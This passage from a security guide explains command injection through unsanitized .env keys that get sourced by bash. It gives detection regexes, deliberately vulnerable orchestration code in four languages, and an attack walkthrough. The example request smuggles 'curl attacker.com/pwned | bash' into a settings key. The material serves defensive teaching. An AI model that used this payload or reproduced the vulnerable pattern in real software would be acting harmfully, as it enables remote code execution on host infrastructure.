\b(?:fs\.writeFileSync\s*\([^,]+,\s*`export\s+\$\{.*\}|fs\.writeFile\s*\([^,]+,.*\$\{.*\})
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
File\.WriteAllTextAsync\([^,]+,\s*\\\$"export\s+\{
```
{% endtab %}

{% tab title="Java" %}
```regexp
Files\.writeString\([^,]+,\s*"export\s+"\s*\+\s*key
```
{% endtab %}

{% tab title="PHP" %}
```regexp
file_put_contents\([^,]+,\s*"export\s+\{\\\$key\}
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
fs\.writeFileSync\([^,]+,\s*`export\s+\\\$\\{key\}
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ContainerOrchestrationWorker 
{
    public async Task ProvisionTenantEnvironmentAsync(string tenantId, Dictionary<string, string> customSettings) 
    {
        var envFilePath = $"/tmp/env_provisioning/{tenantId}.env";
        var envBuilder = new StringBuilder();

        // [1]
        // [2]
        envBuilder.AppendLine("# Auto-generated tenant configuration");

        // [3]
        foreach (var setting in customSettings) 
        {
            // [4]
            envBuilder.AppendLine($"export {setting.Key}=\"{EscapeShellArg(setting.Value)}\"");
        }

        await File.WriteAllTextAsync(envFilePath, envBuilder.ToString());

        // [5]
        var startInfo = new ProcessStartInfo
        {
            FileName = "/bin/bash",
            Arguments = $"-c \"source {envFilePath} && docker run --env-file {envFilePath} my-tenant-image\"",
            UseShellExecute = false
        };

        using var process = Process.Start(startInfo);
        await process.WaitForExitAsync();
    }

    private string EscapeShellArg(string arg) => arg.Replace("\"", "\\\"");
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class ContainerOrchestrationWorker {

    public void provisionTenantEnvironment(String tenantId, Map<String, String> customSettings) throws Exception {
        Path envFilePath = Paths.get("/tmp/env_provisioning/" + tenantId + ".env");
        StringBuilder envBuilder = new StringBuilder();

        // [1]
        // [2]
        envBuilder.append("# Auto-generated tenant configuration\n");

        // [3]
        for (Map.Entry<String, String> setting : customSettings.entrySet()) {
            // [4]
            envBuilder.append("export ").append(setting.getKey()).append("=\"")
                      .append(escapeShellArg(setting.getValue())).append("\"\n");
        }

        Files.writeString(envFilePath, envBuilder.toString());

        // [5]
        String[] cmd = {
            "/bin/bash",
            "-c",
            "source " + envFilePath.toString() + " && docker run --env-file " + envFilePath.toString() + " my-tenant-image"
        };

        Process process = Runtime.getRuntime().exec(cmd);
        process.waitFor();
    }

    private String escapeShellArg(String arg) { return arg.replace("\"", "\\\""); }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class ContainerOrchestrationWorker 
{
    public function provisionTenantEnvironment(string $tenantId, array $customSettings): void 
    {
        $envFilePath = "/tmp/env_provisioning/{$tenantId}.env";
        
        // [1]
        // [2]
        $envContent = "# Auto-generated tenant configuration\n";

        // [3]
        foreach ($customSettings as $key => $value) 
        {
            // [4]
            $envContent .= "export {$key}=\"" . escapeshellarg($value) . "\"\n";
        }

        file_put_contents($envFilePath, $envContent);

        // [5]
        $cmd = "/bin/bash -c 'source {$envFilePath} && docker run --env-file {$envFilePath} my-tenant-image'";
        shell_exec($cmd);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class ContainerOrchestrationWorker {
    static async provisionTenantEnvironment(tenantId, customSettings) {
        const envFilePath = `/tmp/env_provisioning/${tenantId}.env`;
        
        // [1]
        // [2]
        let envContent = `# Auto-generated tenant configuration\n`;

        // [3]
        for (let [key, value] of Object.entries(customSettings)) {
            // [4]
            let safeValue = value.replace(/"/g, '\\"');
            envContent += `export ${key}="${safeValue}"\n`;
        }

        fs.writeFileSync(envFilePath, envContent);

        // [5]
        let cmd = `/bin/bash -c "source ${envFilePath} && docker run --env-file ${envFilePath} my-tenant-image"`;
        
        return new Promise((resolve, reject) => {
            exec(cmd, (error) => {
                if (error) return reject(error);
                resolve();
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The orchestration service is responsible for securely provisioning dedicated instances for specific enterprise tenants, \[2] To comply with strict security requirements preventing secret exposure in hypervisor process lists (`ps`), the developer writes the configuration secrets directly to a localized flat file (`.env`), \[3] The architecture seamlessly merges the system's generated secrets with the tenant's dynamically provided `CustomSettings` array, \[4] The developer assumes that JSON Keys are strictly deterministic configuration properties (e.g., `LOG_LEVEL` or `API_URL`) and omits character sanitization, \[5] The fatal execution sink. The orchestration worker executes the `source` command against the generated `.env` file to load the variables into the current session _before_ invoking the `docker run` command. Because `source` inherently evaluates the file as a raw Bash shell script, the attacker's unsanitized Key structure commands the native OS interpreter to execute arbitrary system binaries on the core orchestration node, completely bypassing the intended Docker isolation wrapper

```http
// 1. Attacker (Tenant Admin) navigates to their Workspace Provisioning dashboard.
// 2. Attacker submits a deployment request containing the structural breakout payload within the Dictionary Key.
POST /api/v1/workspaces/deploy HTTP/1.1
Host: cloud.enterprise.tld
Authorization: Bearer <tenant_admin_token>
Content-Type: application/json

{
  "workspaceName": "Attacker_Workspace_1",
  "customSettings": {
    "DUMMY=\"1\"; curl attacker.com/pwned | bash; export INJECTED": "safe_value"
  }
}

// 3. The Orchestration backend synthesizes the /tmp/env_provisioning/tenant_1.env file on the host OS:
// # Auto-generated tenant configuration
// export DUMMY="1"; curl attacker.com/pwned | bash; export INJECTED="safe_value"

// 4. The Orchestration backend executes the deployment trigger:
// /bin/bash -c "source /tmp/env_provisioning/tenant_1.env && docker run ..."

// 5. The host's bash interpreter parses the sourced file, exports DUMMY, and immediately executes the injected 
// curl/bash pipeline directly on the Cloud Orchestration Server (Host OS), capturing the orchestration control plane.
```
{% endstep %}

{% step %}
To fulfill compliance mandates prohibiting the transport of plaintext secrets via process arguments, platform engineers architected a dynamic DotEnv synthesis pipeline. They correctly identified the risk of secret leakage in hypervisor logs and opted to write ephemeral shell scripts to disk for localized sourcing. The security flaw emerged from an asymmetric trust boundary: engineers painstakingly escaped the configuration _Values_ while explicitly trusting the configuration _Keys_. The attacker weaponized this trust by crafting a JSON key that functionally rewrote the shell syntax. When the backend synthesized the configuration file, it permanently embedded the attacker's command termination strings. During the provisioning lifecycle, the orchestration node invoked the `source` utility to parse the file, inadvertently executing the attacker's payload at the host level and achieving total infrastructure compromise prior to container execution
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
